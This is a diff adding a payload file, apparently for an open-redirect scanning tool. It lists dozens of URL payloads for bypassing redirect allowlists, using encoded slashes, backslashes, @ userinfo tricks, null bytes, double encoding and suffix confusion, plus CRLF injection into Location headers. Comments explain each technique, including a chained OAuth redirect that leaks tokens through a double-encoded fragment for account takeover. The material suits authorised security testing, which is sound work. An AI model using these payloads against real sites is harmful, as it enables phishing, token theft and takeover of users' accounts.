@@ -1,0 +1,142 @@
+# =============================================================================
+# QUERY-VALUE PAYLOADS -- classified automatically at runtime:
+#   Any line containing {TARGET} -> STAGE 2 (needs the site's own trusted domain)
+#   Any line without it          -> STAGE 1 (host-only, no target needed)
+# This file intentionally mixes both; the tool sorts them by scanning for the
+# {TARGET} token. Kept in one file so you don't have to remember which file
+# a new payload belongs in -- just paste it here.
+#
+# Tokens:
+#   {HOST}    -> your test/collaborator domain (-t/--target-domain)
+#   {TARGET}  -> the site's own trusted domain (-T/--target-site, or
+#                auto-extracted per URL if you don't pass -T)
+# =============================================================================
+
+# --- Absolute URL (baseline) ---
+https://{HOST}
+http://{HOST}
+https://{HOST}/
+https://{HOST}/%2e%2e
+
+# --- Protocol-relative ---
+//{HOST}
+////{HOST}
+///{HOST}
+/////{HOST}
+
+# --- Backslash / mixed slash tricks (browsers normalize \ to /) ---
+/\{HOST}
+\/{HOST}
+\/\/{HOST}
+\\{HOST}
+\\/{HOST}
+/\/\{HOST}
+
+# --- Missing / malformed scheme ---
+https:/{HOST}
+https:{HOST}
+https:%2f%2f{HOST}
+https:%2F%5C{HOST}
+HtTpS://{HOST}
+HTTPS://{HOST}
+# Double-scheme confusion (generalized from the "https:https://" pattern seen
+# in a real returnUrl bug bounty report - some parsers strip only one "https:")
+https:https://{HOST}
+
+# --- Encoded slashes (bypass naive "//" / "https://" string filters) ---
+/%2F%2F{HOST}
+/%5C%5C{HOST}
+%2F%2F{HOST}
+%09/{HOST}
+/%09/{HOST}
+# /\evil.com double-encoded (accepted real-world open redirect payload)
+%2F%5C{HOST}
+
+# --- Fragment / query confusion (some parsers stop at # or ?) ---
+https://{HOST}#{TARGET}
+https://{HOST}?{TARGET}
+https://{HOST}\{TARGET}
+https://{HOST}/?redirect={TARGET}
+
+# --- @ userinfo trick (host confusion both directions) ---
+https://{TARGET}@{HOST}
+https://{TARGET}%40{HOST}
+https://{TARGET}@{HOST}/
+http://{TARGET}@{HOST}
+https://{HOST}@{TARGET}
+{TARGET}%40{HOST}
+# Reported bypass: HOST first, then backslash-@, then TARGET as decoy suffix
+https://{HOST}%5C%40{TARGET}
+https://{HOST}\@{TARGET}
+https:https://{HOST}\@{TARGET}
+
+# --- Subdomain / suffix confusion (bypasses naive "endswith/contains TARGET" checks) ---
+https://{TARGET}.{HOST}
+https://{HOST}/{TARGET}
+https://{HOST}/.{TARGET}
+
+# --- Chained trusted-domain path-injection (a reported real-world account
+#     takeover: an OAuth/SSO redirect_uri param allowlists a specific
+#     trusted domain by name, e.g. "does the URL start with our-partner.com".
+#     But if that trusted domain has ITS OWN unrelated path-injection open
+#     redirect bug (see path_payloads.txt), an attacker can pass the
+#     allowlist check with the trusted domain and then chain straight
+#     through it to anywhere - here the "target" you're testing isn't the
+#     app itself, it's whether ITS allowlisted domain is independently
+#     vulnerable. The %2523 suffix is a real reported technique too: a
+#     DOUBLE url-encoded '#' (decodes once to %23, then again to a literal
+#     '#') that survives being decoded once by an intermediate service
+#     while still becoming a real fragment by the time a browser/JS
+#     consumes it - used to push an OAuth token into the URL fragment on
+#     an attacker-controlled page, where JS can read it via location.hash) ---
+https://{TARGET}///{HOST}
+https://{TARGET}///{HOST}/
+https://{TARGET}///{HOST}%2523
+https://{TARGET}///{HOST}%23
+
+# --- Bare (no-scheme) host confusion for redirect_uri-style params that
+#     already have a scheme prepended by the app itself (from a real
+#     Burp-collaborator bug bounty writeup - these often work when a plain
+#     "https://host@..." attempt is rejected but the app re-adds its own scheme) ---
+{TARGET}/%09/{HOST}
+{TARGET}//{HOST}
+{TARGET}\{HOST}
+{TARGET}/%20/{HOST}
+
+# --- CRLF injection into Location header (where header is built unsafely) ---
+%0d%0aLocation:%20https://{HOST}
+%0d%0a%0d%0aLocation:%20https://{HOST}
+/%0d%0aLocation:https://{HOST}
+
+# --- Null byte / whitespace tricks ---
+https://{HOST}%00.{TARGET}
+https://{HOST}%00
+ https://{HOST}
+https://{HOST}%09
+https://{HOST}%0a
+https://{HOST}%0d
+# Real-world report: TARGET first (looks legit), null byte, then full scheme+HOST
+https://{TARGET}%00https://{HOST}
+# JSON-body specific (use with --method POST --body <template.json>) - a real
+# password-reset report bypassed a JSON string filter with \u0000 instead of
+# %00, since %00 isn't meaningful once you're inside a JSON string value.
+# {NULLBYTE} is a real null character, rendered here (not the literal text
+# "\u0000") so it survives correctly through JSON-string encoding.
+{HOST}{NULLBYTE}@{TARGET}
+
+# --- Path traversal style ---
+/..//{HOST}
+/../{HOST}
+..//{HOST}
+
+# --- Double URL encoding ---
+%252F%252F{HOST}
+https%3A%2F%2F{HOST}
+
+# --- Required-substring + required-suffix filter bypass (a reported
+#     bypass: filter required a specific trusted-CDN-path substring AND an
+#     image extension at the end - attacker just supplies both on their own host) ---
+https://{HOST}?{TARGET}/.png
+https://{HOST}?{TARGET}/.jpg
+https://{HOST}?{TARGET}/.gif
+http://{HOST}?{TARGET}/.png
